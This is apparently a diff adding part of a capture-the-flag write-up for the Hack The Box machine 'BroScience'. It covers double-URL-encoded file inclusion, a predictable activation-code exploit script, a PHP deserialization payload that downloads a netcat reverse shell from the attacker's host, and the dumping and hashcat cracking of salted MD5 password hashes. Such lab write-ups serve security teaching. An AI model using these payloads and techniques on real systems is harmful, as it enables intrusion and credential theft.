@@ -92,3 +92,267 @@ If i leave the path parameter empty, i get an empty 200 response, and when i giv
 ❯ curl 'https://broscience.htb/includes/img.php?path=../../../../etc/passwd' -k
 <b>Error:</b> Attack detected.
 ```
+It appears there is a filter preventing me from using `../` to traverse the file system, and absolute paths like `/etc/passwd` don't work either. I try to URL encoding the payload, switching `/` to `\` and the PHP filter `php://filter/convert.base64-encode/path=/etc/passwd` but none of it works. There is an article on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding) that suggests double URL encoding the payload, and it works:
+<img src =../screenshots/htb-broscience/burp-lfi.png>
+I will note that there is a user called **bill** and use this LFI to download all the files i saw in the gobuster scan and the files in the `includes` directory.
+
+## Source code
+
+**includes/db_connect.php**
+```php
+$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";
+
+$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");
+
+if (!$db_conn) {
+    die("<b>Error</b>: Unable to connect to database");
+}
+```
+This file contains credentials for database connection. I tried to ssh to the user **bill** with the password in this file but was unsuccsesful.
+
+**register.php**
+```php
+include_once 'includes/utils.php';
+$activation_code = generate_activation_code();
+$res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
+$res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));
+
+if (pg_num_rows($res) == 0) {
+    $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
+    $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));
+
+    // TODO: Send the activation link to email
+    $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
+
+    $alert = "Account created. Please check your email for the activation link.";
+}
+```
+When user registers, the `generate_activation_code()` function is called and it's result is stored in the database. I will also note the format of the activation link.
+
+**includes/utils.php**
+```php
+function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(time());
+    $activation_code = "";
+    for ($i = 0; $i < 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $activation_code;
+}
+```
+This is vulnerable to timing attack, since the PHP `time()` function returns number of seconds since January 1 1970 00:00:00 GMT. If i execute this function on my local machine, and make a request to register a user within the one second, i should get the same activation code and manage to activate my account.
+
+## Initial access
+PHP on Kali linux is compiled without the `curl` library, and that makes it complicated to make http requests, i will hovewer use a python script and call the php function from it:
+```python
+import random
+import subprocess
+import requests
+
+# add random numbers to make sure username is unique
+username = f"jan{random.randint(0, 1000)}"
+password= "password"
+data = {
+    "username": username,
+    "email": f"{username}@broscience.htb",
+    "password": password,
+    "password-confirm": password
+}
+# get the activation code
+code = subprocess.check_output(["php", "generate_code.php"]).decode()
+
+# register
+requests.post("https://broscience.htb/register.php",data=data, verify=False)
+
+activation_url = f"https://broscience.htb/activate.php?code={code}"
+
+print(f"Username: {username}, password: {password}, activation link: {activation_url}")
+```
+
+When i run the code:
+```
+❯ python3 activate.py                                                                                                         
+Username: jan508, password: password, activation link: https://broscience.htb/activate.php?code=XiNoXaVh5J7VxFDdMPlEqFNu9ioPqhjU
+```
+
+When i click the actiovation url i get a success message and i can login to the application with the provided credentials.
+
+<img src =../screenshots/htb-broscience/web-logged.png>
+Not much changed on the website, except i can now write comments on the posts and can switch to dark theme. I tried to do some SQL injection in the comments, but it didn't work and i even have the source code to see that it is not really vulnerable.
+
+I look at the code that provides the theme switching functionality, and it does deserialization on user provided input, which is always dangerous:
+```php
+class UserPrefs {
+    public $theme;
+
+    public function __construct($theme = "light") {
+		$this->theme = $theme;
+    }
+}
+
+function get_theme() {
+    if (isset($_SESSION['id'])) {
+        if (!isset($_COOKIE['user-prefs'])) {
+            $up_cookie = base64_encode(serialize(new UserPrefs()));
+            setcookie('user-prefs', $up_cookie);
+        } else {
+            $up_cookie = $_COOKIE['user-prefs'];
+        }
+        $up = unserialize(base64_decode($up_cookie));
+        return $up->theme;
+    } else {
+        return "light";
+    }
+}
+```
+This code gets the value of `user-prefs` cookie, decodes it and creates a `UserPrefs` object from it. There is a lot of information on how to exploit PHP deserialization, and i chose to follow [this](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) article. It mentions two 'magic' methods, `__wakeup()` and `__destruct()`. When unserialize is called on an object, these methods will always get executed. If there is a class that implements thse methods, we might be able to abuse it. And there is such a cless, `AvatarInterface`:
+```php
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath; 
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+```
+So, what happens when unserialize is called on an `AvatarInterface` object? It creates an instance of `Avatar` object, and then calls the `save` method of that object. This method then reads a file and writes its contents to another file. Since `file_get_contents` [can](https://www.php.net/manual/en/function.file-get-contents.php) read remote files and i control the path to this file, i can make it read a file with PHP reverse shell and save it on the webserver!
+The attack looks like this:
+1. Start a netcat listener on port 9999
+```
+❯ nc -lvnp 9999
+listening on [any] 9999 ...
+```
+2. Create the file with reverse shell payload and start a webserver to host it
+```
+❯ echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f"); ?>' > payload
+❯ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+3. Generate the malicious object
+```php
+$avatar = new AvatarInterface();
+$avatar->tmp = "http://10.10.14.169:8000/payload";
+$avatar->imgPath = "rev.php";
+$payload = base64_encode(serialize($avatar));
+echo $payload;
+```
+4. Go to the website, change the value of `user-prefs` cookie to payload generated in step 3 and refresh. I see the file was downloaded from the webserver
+```
+❯ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.195 - - [05/Apr/2023 10:57:20] "GET /payload HTTP/1.0" 200 -
+10.10.11.195 - - [05/Apr/2023 10:57:20] "GET /payload HTTP/1.0" 200 -
+10.10.11.195 - - [05/Apr/2023 10:57:20] "GET /payload HTTP/1.0" 200 -
+```
+5. Visit https://broscience.htb/rev.php and get a callback on the netcat listener!!!
+```
+❯ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.169] from (UNKNOWN) [10.10.11.195] 40876
+sh: 0: can't access tty; job control turned off
+$ id  
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+```
+## Privilege escalation
+First, let's upgrade to a proper shell
+```bash
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+www-data@broscience:/var/www/html$ ^Z
+[1]  + 57720 suspended  nc -lvnp 9999
+
+~/Blog/HTB/BroScience main* 17m 11s ❯ stty raw -echo; fg
+[1]  + 57720 continued  nc -lvnp 9999
+
+www-data@broscience:/var/www/html$ stty rows 52 cols 229
+www-data@broscience:/var/www/html$ export TERM=xterm
+```
+I'm `www-data` user since this user was running the website process. There is one other user, bill. First i am going to check out the database to see if it has some credentials for bill. I have the connection information from the `database_connect.php` file, and since its using a `pg_connect()` function, i know its PostgreSQL databse.
+```
+www-data@broscience:/$ /usr/bin/psql -U dbuser -h localhost -d broscience -W 
+Password: 
+psql (13.9 (Debian 13.9-0+deb11u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+broscience=> \dt
+           List of relations
+ Schema |   Name    | Type  |  Owner   
+--------+-----------+-------+----------
+ public | comments  | table | postgres
+ public | exercises | table | postgres
+ public | users     | table | postgres
+(3 rows)
+
+broscience=> select * from users;
+ id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
+----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+(5 rows)
+
+broscience=>
+```
+We get a few usernames and their MD5 hashes, the interesting ones are **bill** and **administrator**. I try to crack these hashes with hashcat and the rockyou wordlist, but it fails. After a while, i realize that the database had a salt 
+```php
+$db_salt = "NaCl";
+```
+and this salt was used when user registred.
+```php
+$res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));
+```
+Looking at hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), there is a hash that has the format i need
+| Hash-Mode  |      Hash-Name     |                    Example                    |   |   |
+|:----------:|:------------------:|:---------------------------------------------:|---|---|
+| 20         |  md5($salt.$pass)  |  f0fda58630310a6dd91a7d8f0a4ceda2:4225637426  |   |   |
+
+I edit the hashes to the correct format
+```bash
+❯ cat hashes
+administrator:15657792073e8a843d4f91fc403454e1:NaCl
+bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
+```
+and start hashcat
+```bash
+❯ hashcat -m 20 --username hashes /usr/share/wordlists/rockyou.txt
+```
+and i get a password for bill.
+```
+❯ hashcat -m 20 --username hashes --show
+bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+```
+I can switch to the bill user now and get the flag.
+```bash
+www-data@broscience:/$ su bill
+Password: 
+bill@broscience:/$ id
+uid=1000(bill) gid=1000(bill) groups=1000(bill)
+bill@broscience:/$ cat ~/user.txt 
+ad8c31e7346aead9347e843ab77a9c4f
+```
